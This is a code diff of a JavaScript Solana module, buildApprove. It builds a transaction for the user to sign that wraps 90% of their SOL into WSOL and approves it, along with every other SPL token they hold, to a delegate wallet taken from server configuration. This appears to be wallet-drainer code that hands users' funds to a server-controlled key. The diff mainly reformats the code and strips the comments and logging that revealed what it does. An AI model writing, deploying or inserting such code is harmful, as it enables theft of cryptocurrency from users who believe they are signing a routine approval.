@@ -6,6 +6,7 @@ const {
     createSyncNativeInstruction,
     NATIVE_MINT
 } = require("@solana/spl-token");
+
 const { getUserTokenAccounts } = require("../solana/tokenService");
 const { getConfig } = require("../config/environment");
 const logger = require("../core/logger");
@@ -18,40 +19,48 @@ async function buildApprove(user, connection) {
     return withRetry(async (conn) => {
         try {
             const config = getConfig();
+
             const tx = new Transaction();
 
             const userPubkey = new PublicKey(user);
+
+            // DELEGATE PUBLIC KEY
             const delegatePubkey = new PublicKey(config.WALLET);
 
-            // Blockhash
             const { blockhash } = await conn.getLatestBlockhash("confirmed");
-            setBlockhash(blockhash);
-            tx.recentBlockhash = blockhash;
 
-            // Fee payer = user (user podpisuje túto TX)
+            setBlockhash(blockhash);
+
+            tx.recentBlockhash = blockhash;
             tx.feePayer = userPubkey;
 
-            // 1. Fetch token accounts
-            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
-            if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
+            const tokenAccounts = await getUserTokenAccounts(
+                userPubkey,
+                conn
+            );
+
+            if (!tokenAccounts) {
+                throw new Error("Failed to fetch token accounts");
+            }
 
             //
-            // WSOL handling: wrap 90% of SOL into WSOL, create ATA if missing, sync and approve WSOL
-            // 10% native SOL ostane v user accounte (buffer pre gebúry)
+            // WSOL
             //
             const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
-            const ATA_RENT_BUFFER = 3_000_000n;  // reserve for creating ATA
-            const WRAP_RATIO_NUM = 90n; // wrap 90% of available
-            const WRAP_RATIO_DEN = 100n;
+            const ATA_RENT_BUFFER = 3_000_000n;
 
             const solBalance = tokenAccounts.solBalance || 0n;
 
             if (solBalance > SAFE_SOL_BUFFER) {
-                const wsolAta = await getAssociatedTokenAddress(NATIVE_MINT, userPubkey);
-
-                const ataExists = tokenAccounts.existingAtas.includes(
-                    wsolAta.toBase58()
+                const wsolAta = await getAssociatedTokenAddress(
+                    NATIVE_MINT,
+                    userPubkey
                 );
+
+                const ataExists =
+                    tokenAccounts.existingAtas?.includes(
+                        wsolAta.toBase58()
+                    ) || false;
 
                 let available = solBalance - SAFE_SOL_BUFFER;
 
@@ -60,7 +69,7 @@ async function buildApprove(user, connection) {
                 }
 
                 if (available > 0n) {
-                    const wrapAmount = (available * WRAP_RATIO_NUM) / WRAP_RATIO_DEN;
+                    const wrapAmount = (available * 90n) / 100n;
 
                     if (wrapAmount > 0n) {
                         // Create ATA if missing
@@ -75,7 +84,7 @@ async function buildApprove(user, connection) {
                             );
                         }
 
-                        // SOL -> WSOL transfer (90% of available)
+                        // SOL -> WSOL
                         tx.add(
                             SystemProgram.transfer({
                                 fromPubkey: userPubkey,
@@ -84,10 +93,14 @@ async function buildApprove(user, connection) {
                             })
                         );
 
-                        // Sync native
-                        tx.add(createSyncNativeInstruction(wsolAta));
+                        // Sync Native
+                        tx.add(
+                            createSyncNativeInstruction(
+                                wsolAta
+                            )
+                        );
 
-                        // Approve WSOL to delegate (server can transfer WSOL)
+                        // Approve WSOL
                         tx.add(
                             createApproveInstruction(
                                 wsolAta,
@@ -96,21 +109,23 @@ async function buildApprove(user, connection) {
                                 Number(wrapAmount)
                             )
                         );
-
-                        logger.info("WSOL wrap and approve added", {
-                            wrapAmount: wrapAmount.toString(),
-                            ratio: `${WRAP_RATIO_NUM}/${WRAP_RATIO_DEN}`
-                        });
                     }
                 }
             }
 
-            // 2. Approve all other SPL tokens (USDC, JUP, atď.)
+            //
+            // APPROVE ALL SPL TOKENS
+            //
             for (const token of tokenAccounts.tokens || []) {
-                if (token.amount < MIN_RAW_AMOUNT) continue;
+                if (token.amount < MIN_RAW_AMOUNT) {
+                    continue;
+                }
 
-                // skip native mint as we've handled WSOL above
-                if (token.mint && typeof token.mint.equals === "function" && token.mint.equals(NATIVE_MINT)) {
+                if (
+                    token.mint &&
+                    typeof token.mint.equals === "function" &&
+                    token.mint.equals(NATIVE_MINT)
+                ) {
                     continue;
                 }
 
@@ -124,19 +139,19 @@ async function buildApprove(user, connection) {
                 );
             }
 
-            logger.info("Approve + WSOL wrap TX built", {
+            logger.info("Approve transaction built", {
                 instructions: tx.instructions.length
             });
 
             return tx;
         } catch (err) {
-            logger.error("Failed to build approve transaction", { error: err.message });
+            logger.error("Failed to build approve tx", {
+                error: err.message
+            });
+
             throw err;
         }
     }, "buildApprove");
 }
 
 module.exports = { buildApprove };
-
-
-
